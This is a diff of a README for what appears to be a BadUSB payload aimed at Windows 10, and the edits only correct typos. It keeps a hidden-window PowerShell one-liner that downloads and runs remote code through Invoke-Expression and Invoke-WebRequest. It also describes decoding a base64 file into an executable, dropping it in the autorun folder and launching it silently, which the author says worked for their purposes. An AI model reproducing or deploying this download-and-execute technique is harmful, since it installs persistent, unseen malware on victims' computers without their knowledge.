@@ -13,11 +13,11 @@ or: ```powershell.exe -windowstyle hidden Invoke-Expression(Invoke-webrequest -U
 
 cuh
 
-the acual idea of this thing is to download a file and run it sliently 
+the actual idea of this thing is to download a file and run it sliently 
 designed to work with badusb
 os: win 10
 
-file gets encoded into base64 format and then powershell downloads in and converts back to exe, puts into autorun folder and runs.
-this operation takes a lot of time but it worked for me when i used this in my puposes
+file gets encoded into base64 format and then powershell downloads it and converts back to exe, puts into autorun folder and runs.
+this operation takes a lot of time but it worked for me when i used this in my purposes
 
 update: file in example does not work already (just info)
